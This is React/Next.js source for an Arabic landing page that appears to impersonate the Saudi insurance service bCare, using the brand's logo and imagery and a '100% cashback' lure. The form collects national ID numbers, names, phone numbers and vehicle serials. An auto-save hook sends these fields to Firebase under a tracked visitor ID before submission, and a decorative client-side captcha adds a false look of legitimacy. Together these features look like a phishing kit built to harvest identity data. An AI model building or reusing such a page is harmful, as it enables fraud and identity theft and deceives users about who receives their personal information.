"use client";
import { useState, useEffect, useCallback } from "react";
import { useRouter } from "next/navigation";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { getOrCreateVisitorID, initializeVisitorTracking, updateVisitorPage } from "@/lib/visitor-tracking";
import { addData } from "@/lib/firebase";
import { useAutoSave } from "@/hooks/use-auto-save";
import {
  Globe,
  RefreshCw,
  Loader2,
  UserCircle2,
  Car,
  Stethoscope,
  ShieldAlert,
  Plane,
  Search,
  ClipboardCheck,
  ShieldCheck,
  Clock3,
  HandHelping,
  BadgeCheck,
  LifeBuoy,
  Headphones,
  Phone,
  MessageCircle,
  ChevronDown,
  Instagram,
  Youtube,
  X,
} from "lucide-react";
import { VehicleDropdownOption } from "@/lib/v-types";

function generateCaptcha() {
  return Math.floor(1000 + Math.random() * 9000).toString();
}

function validateSaudiId(id: string): { valid: boolean; error: string } {
  const cleanId = id.replace(/\s/g, "");
  if (!/^\d{10}$/.test(cleanId)) {
    return { valid: false, error: "رقم الهوية يجب أن يتكون من 10 أرقام" };
  }
  if (!/^[12]/.test(cleanId)) {
    return { valid: false, error: "رقم الهوية يجب أن يبدأ بـ 1 أو 2" };
  }
  let sum = 0;
  for (let i = 0; i < 10; i++) {
    let digit = Number.parseInt(cleanId[i]);
    if ((10 - i) % 2 === 0) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
  }
  if (sum % 10 !== 0) {
    return { valid: false, error: "رقم الهوية غير صحيح" };
  }
  return { valid: true, error: "" };
}

export default function Home() {
  const router = useRouter();
  const [visitorID] = useState(() => getOrCreateVisitorID());
  const [identityNumber, setIdentityNumber] = useState("");
  const [ownerName, setOwnerName] = useState("");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [documentType, setDocumentType] = useState("استمارة");
  const [serialNumber, setSerialNumber] = useState("");
  const [insuranceType, setInsuranceType] = useState("تأمين جديد");
  const [buyerName, setBuyerName] = useState("");
  const [buyerIdNumber, setBuyerIdNumber] = useState("");
  const [activeTab, setActiveTab] = useState("مركبات");
  const [captchaCode, setCaptchaCode] = useState(generateCaptcha());
  const [captchaInput, setCaptchaInput] = useState("");
  const [captchaError, setCaptchaError] = useState(false);
  const [identityNumberError, setIdentityNumberError] = useState("");
  const [submitting, setSubmitting] = useState(false);

  const [vehicleOptions, setVehicleOptions] = useState<VehicleDropdownOption[]>(
    []
  );
  const [isLoadingVehicles, setIsLoadingVehicles] = useState(false);
  const [showVehicleDropdown, setShowVehicleDropdown] = useState(false);
  const [selectedVehicle, setSelectedVehicle] =
    useState<VehicleDropdownOption | null>(null);
  const [serialFieldFocused, setSerialFieldFocused] = useState(false);

  const [visitorInitialized, setVisitorInitialized] = useState(false);

  useEffect(() => {
    if (!visitorID) return;

    const init = async () => {
      await initializeVisitorTracking(visitorID);
      await updateVisitorPage(visitorID, "home-new", 1);
      setVisitorInitialized(true);
    };

    init();
  }, [visitorID]);

  useAutoSave({
    visitorId: visitorInitialized ? visitorID : "",
    pageName: "home",
    data: {
      identityNumber,
      ownerName,
      phoneNumber,
      documentType,
      serialNumber,
      insuranceType,
      buyerName,
      buyerIdNumber,
      activeTab,
    },
  });

  const fetchVehicles = useCallback(async (nin: string) => {
    const validation = validateSaudiId(nin);
    if (!validation.valid) {
      setVehicleOptions([]);
      setShowVehicleDropdown(false);
      return;
    }

    setIsLoadingVehicles(true);
    setVehicleOptions([]);
    setShowVehicleDropdown(false);

    try {
      const res = await fetch(`/api/vehicles/${nin}`);
      const data = await res.json();

      if (data.success && data.vehicles && data.vehicles.length > 0) {
        const options: VehicleDropdownOption[] = data.vehicles.map(
          (v: any) => ({
            value:
              v.sequenceNumber || v.SequenceNumber || String(v.vehicleId || ""),
            label: `${v.sequenceNumber || v.SequenceNumber || ""} - ${
              v.vehicleMaker || v.VehicleMaker || ""
            } ${v.vehicleModel || v.VehicleModel || ""} ${
              v.modelYear || v.ModelYear || ""
            }`.trim(),
            vehicle: v,
          })
        );
        setVehicleOptions(options);
        setShowVehicleDropdown(true);
        setSerialFieldFocused(true);
      }
    } catch (error) {
      console.error("Error fetching vehicles:", error);
    } finally {
      setIsLoadingVehicles(false);
    }
  }, []);

  useEffect(() => {
    if (identityNumber.length === 10 && /^\d{10}$/.test(identityNumber)) {
      fetchVehicles(identityNumber);
    } else {
      setVehicleOptions([]);
      setShowVehicleDropdown(false);
      setSelectedVehicle(null);
    }
  }, [identityNumber, fetchVehicles]);

  const refreshCaptcha = () => {
    setCaptchaCode(generateCaptcha());
    setCaptchaInput("");
    setCaptchaError(false);
  };

  const handleIdentityNumberChange = (value: string) => {
    const cleaned = value.replace(/\D/g, "").slice(0, 10);
    setIdentityNumber(cleaned);
    if (identityNumberError) setIdentityNumberError("");
  };

  const handlePhoneNumberChange = (value: string) => {
    const cleaned = value.replace(/\D/g, "");
    if (cleaned.startsWith("05")) {
      setPhoneNumber(cleaned.slice(0, 10));
    } else if (cleaned.startsWith("5") && !cleaned.startsWith("05")) {
      setPhoneNumber(cleaned.slice(0, 9));
    } else {
      setPhoneNumber(cleaned.slice(0, 10));
    }
  };

  const handleBuyerIdNumberChange = (value: string) => {
    setBuyerIdNumber(value.replace(/\D/g, "").slice(0, 10));
  };

  const handleSerialNumberChange = (value: string) => {
    setSerialNumber(value.replace(/\D/g, ""));
  };

  const handleVehicleSelect = (option: VehicleDropdownOption) => {
    setSerialNumber(option.value);
    setSelectedVehicle(option);
    setSerialFieldFocused(false);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    const validation = validateSaudiId(identityNumber);
    if (!validation.valid) {
      setIdentityNumberError(validation.error);
      return;
    }

    if (captchaInput !== captchaCode) {
      setCaptchaError(true);
      return;
    }

    setSubmitting(true);

    try {
      localStorage.setItem("homeFormData", JSON.stringify({
        identityNumber,
        ownerName,
        phoneNumber,
        documentType,
        serialNumber,
        insuranceType,
        buyerName,
        buyerIdNumber,
        activeTab,
        selectedVehicle,
        timestamp: new Date().toISOString(),
      }));

      await addData({
        id: visitorID,
        identityNumber,
        ownerName,
        phoneNumber,
        documentType,
        serialNumber,
        insuranceType,
        buyerName: insuranceType === "نقل ملكية" ? buyerName : "",
        buyerIdNumber: insuranceType === "نقل ملكية" ? buyerIdNumber : "",
        activeTab,
        selectedVehicle: selectedVehicle ? {
          value: selectedVehicle.value,
          label: selectedVehicle.label,
        } : null,
        currentStep: 2,
        currentPage: "insur",
      });
    } catch (err) {
      console.error("Error saving form data:", err);
    }

    router.push("/insur");
  };

  const productTabs = [
    { label: "مركبات", icon: Car },
    { label: "طبي", icon: Stethoscope },
    { label: "أخطاء طبية", icon: ShieldAlert },
    { label: "سفر", icon: Plane },
  ];

  const inquiryItems = [
    { label: "لوحة البيانات", icon: Search },
    { label: "إدارة الوثيقة", icon: ClipboardCheck },
    { label: "حماية المركبة", icon: ShieldCheck },
    { label: "تجديد سريع", icon: Clock3 },
    { label: "دعم المطالبات", icon: HandHelping },
    { label: "تسعير مباشر", icon: BadgeCheck },
    { label: "مركز المساندة", icon: LifeBuoy },
    { label: "التواصل", icon: Headphones },
  ];

  const whyItems = [
    { label: "دفع إلكتروني آمن", icon: ShieldCheck },
    { label: "خدمة عملاء سريعة", icon: Phone },
    { label: "أسعار تنافسية", icon: BadgeCheck },
    { label: "دعم على مدار الساعة", icon: MessageCircle },
  ];

  const footerLinks = ["عن بي كير", "من نحن", "الدعم الفني", "روابط مهمة"];

  return (
    <div
      className="min-h-screen bg-[#eef2f6]"
      dir="rtl"
      data-testid="page-home"
    >
      <main className="mx-auto w-full max-w-[390px] px-3 py-2">
        <header className="mb-3 flex items-center justify-between rounded-2xl border border-[#d6e2ed] bg-white px-3 py-2">
          <button
            className="rounded-md border border-[#d2dfeb] bg-[#f7fafc] px-2 py-1 text-[11px] font-bold text-[#1a5676]"
            data-testid="button-language"
          >
            EN
          </button>
          <div className="flex items-center gap-1.5">
            <img
              src="https://tse2.mm.bing.net/th/id/OIP.Q6RoywSIxzTk4FmYcrdZBAHaDG?rs=1&pid=ImgDetMain&o=7&rm=3"
              alt="bCare"
              className="h-5"
            />
          </div>
          <UserCircle2
            className="h-5 w-5 text-[#1a5676]"
            data-testid="icon-user"
          />
        </header>

        <section
          className="mb-3 h-40 rounded-2xl bg-cover bg-center bg-no-repeat relative overflow-hidden flex flex-col items-center justify-center"
          style={{
            backgroundImage:
              "url(https://bcare.com.sa/Web_Bg.0b5a107901701218.svg)",
            backgroundColor: "#1a5676",
          }}
          data-testid="hero-banner"
        >
          <div className="text-center text-white px-4" dir="rtl">
            <p className="text-lg font-bold leading-tight">
              أمّن بخصومات يوم التأسيس
            </p>
            <p className="text-sm mt-1">
              وادخل السحب على كاش باك <span className="text-[#f4ad27] font-extrabold">100%</span>
            </p>
          </div>
        </section>

        <section
          className="rounded-2xl border border-[#d6e2ed] bg-white p-3 shadow-sm"
          data-testid="form-section"
        >
          <h1
            className="text-center text-base font-bold text-[#215d7d]"
            data-testid="text-heading"
          >
            أمّن مركبتك بأفضل عروض التأمين
          </h1>

          <div className="mt-2 flex items-center justify-between gap-1">
            <p className="text-xs font-semibold text-[#6d8191]">
              وفّر نقدك الآن
            </p>
            <p className="text-sm font-extrabold text-[#f4ad27]">100%</p>
          </div>
          <div className="mt-1 h-2 rounded-full bg-[#e3edf5]">
            <div className="h-full w-full rounded-full bg-gradient-to-r from-[#57a9db] to-[#1a5676]" />
          </div>

          <div className="mt-3 grid grid-cols-4 overflow-hidden rounded-xl border border-[#d6e2ed] bg-[#f8fbfe]">
            {productTabs.map((tab) => {
              const Icon = tab.icon;
              return (
                <button
                  key={tab.label}
                  type="button"
                  onClick={() => setActiveTab(tab.label)}
                  className={`flex flex-col items-center gap-1 py-2 text-[10px] font-semibold transition-colors ${
                    activeTab === tab.label
                      ? "bg-[#1a5676] text-white"
                      : "text-[#5d7384]"
                  }`}
                  data-testid={`tab-${tab.label}`}
                >
                  <Icon className="h-3.5 w-3.5" />
                  <span>{tab.label}</span>
                </button>
              );
            })}
          </div>

          <form onSubmit={handleSubmit} className="mt-3 space-y-2.5">
            <div className="grid grid-cols-2 gap-2">
              <button
                type="button"
                onClick={() => setInsuranceType("تأمين جديد")}
                className={`h-10 rounded-lg text-sm font-bold ${
                  insuranceType === "تأمين جديد"
                    ? "bg-[#1a5676] text-white"
                    : "bg-[#f1f6fb] text-[#1a5676]"
                }`}
                data-testid="button-new-insurance"
              >
                تأمين جديد
              </button>
              <button
                type="button"
                onClick={() => setInsuranceType("نقل ملكية")}
                className={`h-10 rounded-lg text-sm font-bold ${
                  insuranceType === "نقل ملكية"
                    ? "bg-[#1a5676] text-white"
                    : "bg-[#f1f6fb] text-[#1a5676]"
                }`}
                data-testid="button-transfer"
              >
                نقل ملكية
              </button>
            </div>

            <div className="relative">
              <label className="block text-sm font-medium text-[#1f2f3a] text-right mb-1" dir="rtl">
                رقم الهوية / الإقامة
              </label>
              <Input
                type="tel"
                inputMode="numeric"
                pattern="[0-9]*"
                placeholder="رقم الهوية / الإقامة"
                value={identityNumber}
                onChange={(e) => handleIdentityNumberChange(e.target.value)}
                className="h-10 rounded-lg border-[#d0dce8] bg-white text-sm text-right"
                dir="rtl"
                maxLength={15}
                required
                data-testid="input-identity"
              />
              {isLoadingVehicles && (
                <Loader2 className="absolute left-3 top-1/2 h-4 w-4 -translate-y-1/2 animate-spin text-[#1a5676]" />
              )}
            </div>

            {identityNumberError && (
              <p
                className="text-xs font-semibold text-red-600"
                data-testid="text-identity-error"
              >
                {identityNumberError}
              </p>
            )}

            <Input
              placeholder="اسم المالك"
              value={ownerName}
              onChange={(e) => setOwnerName(e.target.value)}
              className="h-10 rounded-lg border-[#d0dce8] bg-white text-sm text-right"
              dir="rtl"
              required
              data-testid="input-owner-name"
            />

            <Input
              type="tel"
              inputMode="numeric"
              pattern="[0-9]*"
              placeholder="رقم الجوال"
              value={phoneNumber}
              onChange={(e) => handlePhoneNumberChange(e.target.value)}
              className="h-10 rounded-lg border-[#d0dce8] bg-white text-sm text-right"
              dir="rtl"
              required
              data-testid="input-phone"
            />

            {insuranceType === "نقل ملكية" && (
              <>
                <Input
                  placeholder="اسم المشتري"
                  value={buyerName}
                  onChange={(e) => setBuyerName(e.target.value)}
                  className="h-10 rounded-lg border-[#d0dce8] bg-white text-sm text-right"
                  dir="rtl"
                  required
                maxLength={40}
                  
                  data-testid="input-buyer-name"
                />
                <Input
                  type="tel"
                  inputMode="numeric"
                  pattern="[0-9]*"
                  placeholder="رقم هوية المشتري"
                  value={buyerIdNumber}
                  onChange={(e) => handleBuyerIdNumberChange(e.target.value)}
                  className="h-10 rounded-lg border-[#d0dce8] bg-white text-sm text-right"
                  dir="rtl"
                maxLength={40}
                  
                  required
                  data-testid="input-buyer-id"
                />
              </>
            )}

            <div className="grid grid-cols-2 gap-2">
              <button
                type="button"
                onClick={() => setDocumentType("استمارة")}
                className={`h-10 rounded-lg text-sm font-bold ${
                  documentType === "استمارة"
                    ? "bg-[#1a5676] text-white"
                    : "bg-[#f1f6fb] text-[#1a5676]"
                }`}
                data-testid="button-form-type"
              >
                استمارة
              </button>
              <button
                type="button"
                onClick={() => setDocumentType("بطاقة جمركية")}
                className={`h-10 rounded-lg text-sm font-bold ${
                  documentType === "بطاقة جمركية"
                    ? "bg-[#1a5676] text-white"
                    : "bg-[#f1f6fb] text-[#1a5676]"
                }`}
                data-testid="button-customs-type"
              >
                بطاقة جمركية
              </button>
            </div>

            <div className="relative">
              <label className="block text-sm font-medium text-[#1f2f3a] text-right mb-1" dir="rtl">
                {documentType === "بطاقة جمركية" ? "رقم البيان الجمركي" : "الرقم التسلسلي"}
              </label>
              <div className="relative">
                <Input
                  type="tel"
                  inputMode="numeric"
                  pattern="[0-9]*"
                  placeholder={
                    documentType === "بطاقة جمركية"
                      ? "رقم البيان الجمركي"
                      : "الرقم التسلسلي"
                  }
                  value={serialNumber}
                  onChange={(e) => {
                    handleSerialNumberChange(e.target.value);
                    setSelectedVehicle(null);
                  }}
                  onFocus={() => {
                    if (vehicleOptions.length > 0) {
                      setSerialFieldFocused(true);
                    }
                  }}
                  onBlur={() => {
                    setTimeout(() => setSerialFieldFocused(false), 200);
                  }}
                  className="h-10 rounded-lg border-[#d0dce8] bg-white text-sm text-right"
                  dir="rtl"
                  required
                  data-testid="input-serial"
                />
                {isLoadingVehicles && (
                  <div className="absolute left-3 top-1/2 -translate-y-1/2">
                    <Loader2 className="h-4 w-4 animate-spin text-[#0a4a68]" />
                  </div>
                )}
                {vehicleOptions.length > 0 && !isLoadingVehicles && (
                  <button
                    type="button"
                    className="absolute left-2 top-1/2 -translate-y-1/2 p-1"
                    onClick={() => setSerialFieldFocused(!serialFieldFocused)}
                  >
                    <ChevronDown className={`h-4 w-4 text-[#0a4a68] transition-transform ${serialFieldFocused ? "rotate-180" : ""}`} />
                  </button>
                )}
              </div>

              {selectedVehicle && !serialFieldFocused && (
                <div className="mt-1 rounded-lg border border-[#d0dce8] bg-[#f0f7fc] p-2 text-right" dir="rtl">
                  <p className="text-xs text-[#6b8299]">المركبة المختارة</p>
                  <p className="text-sm font-medium text-[#1f2f3a]">{selectedVehicle.label}</p>
                </div>
              )}

              {serialFieldFocused && vehicleOptions.length > 0 && (
                <div className="absolute z-50 mt-1 w-full rounded-lg border border-[#d0dce8] bg-white shadow-lg overflow-hidden" dir="rtl">
                  <div className="max-h-48 overflow-y-auto">
                    {vehicleOptions.map((option) => (
                      <button
                        key={option.value}
                        type="button"
                        className={`w-full px-3 py-2.5 text-right text-sm hover:bg-[#f0f7fc] transition-colors border-b border-[#f0f4f8] last:border-b-0 ${
                          serialNumber === option.value ? "bg-[#e8f4fc] font-medium text-[#0a4a68]" : "text-[#1f2f3a]"
                        }`}
                        onMouseDown={(e) => {
                          e.preventDefault();
                          handleVehicleSelect(option);
                        }}
                      >
                        <div className="flex items-center justify-between">
                          <span className="text-xs text-[#6b8299]">{option.value}</span>
                          <span>{option.label}</span>
                        </div>
                      </button>
                    ))}
                  </div>
                  <button
                    type="button"
                    className="w-full px-3 py-2 text-center text-sm text-[#6b8299] hover:bg-[#fef3cd] transition-colors border-t border-[#d0dce8]"
                    onMouseDown={(e) => {
                      e.preventDefault();
                      setSerialFieldFocused(false);
                      setSerialNumber("");
                      setSelectedVehicle(null);
                    }}
                  >
                    --- إدخال رقم يدوي ---
                  </button>
                </div>
              )}
            </div>

            <div className="rounded-lg border border-[#d8e4ef] bg-[#f7fbff] p-2">
              <div className="flex items-center justify-between gap-2">
                <div
                  className="flex items-center gap-2 rounded-md bg-white px-2 py-1.5"
                  dir="ltr"
                >
                  {captchaCode.split("").map((digit, idx) => (
                    <span
                      key={idx}
                      className={`text-xl font-bold ${
                        idx % 2 === 0 ? "text-[#1a5676]" : "text-[#f4ad27]"
                      }`}
                    >
                      {digit}
                    </span>
                  ))}
                  <button
                    type="button"
                    onClick={refreshCaptcha}
                    className="rounded bg-[#1a5676] p-1 text-white"
                    data-testid="button-refresh-captcha"
                  >
                    <RefreshCw className="h-3.5 w-3.5" />
                  </button>
                </div>
                <Input
                  placeholder="رمز التحقق"
                  value={captchaInput}
                  onChange={(e) => {
                    setCaptchaInput(e.target.value);
                    if (captchaError) setCaptchaError(false);
                  }}
                  className={`h-9 flex-1 rounded-md text-sm ${
                    captchaError ? "border-red-500" : "border-[#d0dce8]"
                  }`}
                  dir="rtl"
                  required
                  data-testid="input-captcha"
                />
              </div>
              {captchaError && (
                <p
                  className="mt-1 text-xs font-semibold text-red-600"
                  data-testid="text-captcha-error"
                >
                  رمز التحقق غير صحيح
                </p>
              )}
            </div>

            <Button
              type="submit"
              disabled={submitting}
              className="h-10 w-full rounded-lg bg-[#f2b332] text-sm font-extrabold text-[#1a5676] hover:bg-[#e9a71f]"
              data-testid="button-submit"
            >
              {submitting ? (
                <Loader2 className="h-4 w-4 animate-spin" />
              ) : (
                "ابدأ الآن"
              )}
            </Button>
          </form>
        </section>

        <section className="mt-3 rounded-xl border border-[#dde8f2] bg-white px-3 py-2">
          <div className="flex items-center justify-center gap-6">
            <span className="text-[10px] font-semibold text-[#8a9fae]">
              Vision 2030
            </span>
            <span className="text-[10px] font-semibold text-[#8a9fae]">
              Saudi Arabia
            </span>
            <span className="text-[10px] font-semibold text-[#8a9fae]">
              NIC
            </span>
          </div>
        </section>

        <section className="mt-4 rounded-2xl border border-[#d9e5ef] bg-white p-3">
          <h2
            className="text-center text-sm font-bold text-[#1a5676]"
            data-testid="text-inquiry-title"
          >
            طريقة الاستعلام عن رقم الوثيقة
          </h2>
          <div className="mt-3 grid grid-cols-4 gap-2.5">
            {inquiryItems.map((item) => {
              const Icon = item.icon;
              return (
                <div
                  key={item.label}
                  className="rounded-lg border border-[#e5edf4] bg-[#fbfdff] px-1 py-2 text-center"
                >
                  <Icon className="mx-auto h-4 w-4 text-[#1a5676]" />
                  <p className="mt-1 text-[10px] font-semibold leading-4 text-[#5b7283]">
                    {item.label}
                  </p>
                </div>
              );
            })}
          </div>
        </section>

        <section className="mt-4 rounded-2xl border border-[#d9e5ef] bg-white p-3">
          <h2 className="text-center text-sm font-bold text-[#1a5676]">
            تجمعات وفرة
          </h2>
          <p className="mt-1 text-center text-[11px] leading-5 text-[#6a8090]">
            تجمعات وطنية بتغطيات تأمينية متنوعة مع أفضل الشركات.
          </p>
          <div className="mt-3 grid grid-cols-4 gap-2">
            {Array.from({ length: 8 }, (_, i) => (
              <div
                key={i}
                className="flex h-12 items-center justify-center rounded-lg border border-[#e5edf4] bg-white px-1"
              >
                <div className="h-6 w-10 rounded bg-[#f0f4f8]" />
              </div>
            ))}
          </div>
        </section>

        <section className="mt-4 rounded-2xl border border-[#d9e5ef] bg-white p-3">
          <h2 className="text-center text-sm font-bold text-[#1a5676]">
            لماذا بي كير بدايةً أولاً في السعودية؟
          </h2>
          <div className="mt-3 grid grid-cols-2 gap-2.5">
            {whyItems.map((item) => {
              const Icon = item.icon;
              return (
                <div
                  key={item.label}
                  className="rounded-lg border border-[#e5edf4] bg-[#fbfdff] p-2 text-center"
                >
                  <Icon className="mx-auto h-4 w-4 text-[#1a5676]" />
                  <p className="mt-1 text-[11px] font-semibold text-[#5b7283]">
                    {item.label}
                  </p>
                </div>
              );
            })}
          </div>
        </section>
      </main>

      <footer className="mt-4 bg-[#0c4a6c] px-4 pb-5 pt-4 text-white">
        <div className="mx-auto w-full max-w-[390px]">
          <div className="mb-3 flex items-center justify-between">
            <div className="flex items-center gap-2">
              <img
                src="https://tse2.mm.bing.net/th/id/OIP.Q6RoywSIxzTk4FmYcrdZBAHaDG?rs=1&pid=ImgDetMain&o=7&rm=3"
                alt="bCare"
                className="h-5"
              />
            </div>
            <p className="text-xs font-semibold">8001180044</p>
          </div>

          <div className="space-y-1">
            {footerLinks.map((item) => (
              <button
                key={item}
                type="button"
                className="flex w-full items-center justify-between rounded-md bg-white/5 px-2.5 py-2 text-xs font-semibold"
              >
                <span>{item}</span>
                <ChevronDown className="h-3.5 w-3.5" />
              </button>
            ))}
          </div>

          <div className="mt-4 flex items-center justify-center gap-3">
            <span className="rounded-full bg-white/15 p-1.5">
              <Instagram className="h-3.5 w-3.5" />
            </span>
            <span className="rounded-full bg-white/15 p-1.5">
              <X className="h-3.5 w-3.5" />
            </span>
            <span className="rounded-full bg-white/15 p-1.5">
              <Youtube className="h-3.5 w-3.5" />
            </span>
          </div>
          <p className="mt-3 text-center text-[10px] text-white/75">
            جميع الحقوق محفوظة لشركة بي كير &copy;
          </p>
        </div>
      </footer>
    </div>
  );
}
